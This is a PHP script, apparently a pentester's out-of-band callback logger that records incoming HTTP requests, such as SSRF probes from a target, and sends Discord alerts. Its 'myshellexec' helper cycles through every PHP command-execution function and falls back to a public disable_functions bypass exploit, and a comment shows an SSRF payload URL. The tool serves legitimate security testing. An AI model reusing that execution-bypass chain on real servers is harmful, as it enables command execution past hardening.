<?php

/*
Title: OOB HTTP Request logger for TuPOC with Discord notification
Author: @osiryszzz

What this script does:
	This PHP script will fetch the entire HTTP request from the client, store
	the results in the logs, and send you a notification over Discord

How to use this:
	Once all is setup, you can test it out this way:
		https://youruser.x1.pe/path_to_this_script/yoob-log-notify.php?label=<UNIQUE_ID_CODENAME>

	the label is to help you identify which request/function you tested
	label doesn't have to be there, you can also omit it.

	If you have a SSRF (HTTP) on a target and RoE only allows TuPOC,
	you can do the following:
		http://vuln.target/page?ssrf=https://youruser.x1.pe/path_to_this_script/yoob-log-notify.php?label=TestingPageSSRF

How to set this up:

	The most recent version of notify doesn't have support for the 
	"-rl" flag anymore, which had TLS checks disabled when used.
	When I realiased this I went on and compiled an older version
	that still supported it and uploaded the binary in this repo. 
	If you don't trust it (Osirys is bad and backdoored it), then feel
	free to go back on github and find their previous version with support
	for that flag and compile it yourself.
	
	From within "/" of your TuPOC (as seen from the chrooted environment),
	please, start with "cd ." to make sure you are at the right place.
	Create a folder (eg: lamerlolz).
	You should have now this FS structure:
		/httpdocs/
		/bin/
		... snip ...
		/lamerlolz/
	
	Upload the below onto /lamerlolz/
		1. notify's binary path 
		2. notify's yaml config path
	
	Now, set the values of $notify_bin_path and $notify_yaml_path of this script
	to point to that folder in this manner:
		"/lamerlolz/notify"
		"/lamerlolz/notify_config.yaml"

	Then, within "/httpdocs/" create a folder (oob_logs_whatever) for storing the
	interaction logs and set its value (/httpdocs/oob_logs_whatever) to $oob_logs_path.
	
	This PHP script should be placed in the same directory where oob_logs_whatever is.
	
	Example syntax of notify.yaml config (replace <stuff> accordingly)
	-------------------------------------------
	discord:
  	    - id: "notify"
    		discord_channel: "<chan>"
    		discord_username: "<nick>"
    		discord_format: "{{data}}"
    		discord_webhook_url: "<URL>"
		
	-------------------------------------------

	It needs to have the provider set to "discord" and the "id" set to "notify"
	or else you will need to change the args in the $cmd variable in this script
	to reflect your yaml.
	Sure I could add extra config vars like below but be real it's a tiny script
	no need for over-engineering.

*/

// Update below

$notify_bin_path="/lamerlolz/notify";
$notify_yaml_path="/lamerlolz/notify_config.yaml";
$oob_logs_path="/oob_logs_whatever/";

// End of edits required


function myshellexec($cfe) {
	$res = '';
	if (!empty($cfe)) {

		if (@function_exists('passthru')) {
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif (@function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
		}
		elseif (@function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
		}
		elseif (@function_exists('system')) {
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif (@is_resource($f = @popen($cfe,"r"))) {
			$res = "";
			if (@function_exists('fread') &&@function_exists('feof')) {
				while (!@feof($f)) {
					$res .= @fread($f,1024);
				}
			}
			elseif (@function_exists('fgets') &&@function_exists('feof')) {
				while(!@feof($f)) {
					$res .= @fgets($f,1024);
				}
			}
			@pclose($f);
		}
		elseif (@is_resource($f = @proc_open($cfe,array(1 =>array("pipe","w")),$pipes))) {
			$res = "";
			if(@function_exists('fread') &&@function_exists('feof')) {
				while(!@feof($pipes[1])) {
					$res .= @fread($pipes[1],1024);
				}
			}
			elseif (@function_exists('fgets') &&@function_exists('feof')) {
				while(!@feof($pipes[1])) {
					$res .= @fgets($pipes[1],1024);
				}
			}
			@proc_close($f);
		}
		// see: https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php
		elseif(@function_exists('pwn')) {
			@ob_start();
			pwn($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
	}
	return $res;
}


function getIPAddress() {  
	//whether ip is from the share internet  
	 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {  
		$ip = $_SERVER['HTTP_CLIENT_IP'];  
	}  
	//whether ip is from the proxy  
	elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
	}  
	//whether ip is from the remote address  
	else {  
		$ip = $_SERVER['REMOTE_ADDR'];  
	}  
	return $ip;  
}  

function logRequest($targetFile,$oob_notification_filename,$label){

	global $notify_bin_path, $notify_yaml_path, $oob_logs_path;

	$headerList = [];
	foreach ($_SERVER as $name => $value) {

		if (preg_match('/^HTTP_/',$name)) {
		// convert HTTP_HEADER_NAME to Header-Name

			$name = strtr(substr($name,5),'_',' ');
			$name = ucwords(strtolower($name));
			$name = strtr($name,' ','-');
			$headerList[$name] = $value;
		}
	}

	$data = sprintf("%s %s %s\n", $_SERVER['REQUEST_METHOD'], $_SERVER['REQUEST_URI'], $_SERVER['SERVER_PROTOCOL']);

	foreach ($headerList as $name => $value) {
		$data .= $name.': '.$value."\n";
	}

	$data .= "\n";
	
	$time_request_inbound=date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME']);
	$victim=getIPAddress();

	$final_content="\nIncoming HTTP request from ".$victim." at ".$time_request_inbound.
					" UTC\nRaw HTTP request dump:\n\n".$data.file_get_contents('php://input');
	
	file_put_contents($targetFile, $final_content."\n");

	$label_str="\n";
	if (strlen($label) > 0) {
		
		$label=filter_var($label,FILTER_SANITIZE_STRING);
		$label_str="\nLabel used: *".$label."*\n";
	}

	$not_str="**OOB just triggered on TuPOC**".$label_str."Check log file: *".basename($targetFile)."*\n";
	file_put_contents($oob_notification_filename,$not_str);
	
	$cmd = $_SERVER['HOME'].$notify_bin_path." -id notify -provider discord -provider-config ".
	$_SERVER['HOME'].$notify_yaml_path." -rl 1 -bulk -data ".$oob_notification_filename;
	
	$output=myshellexec($cmd." 2>&1");

}

$label='';
if (isset($_GET['label'])) {
	$label=$_GET['label'];
}

$filename=".".$oob_logs_path."post-".time().".log";
$oob_notification_filename=".".$oob_logs_path."notification_summary-".time().".log";
logRequest($filename,$oob_notification_filename,$label);

?>
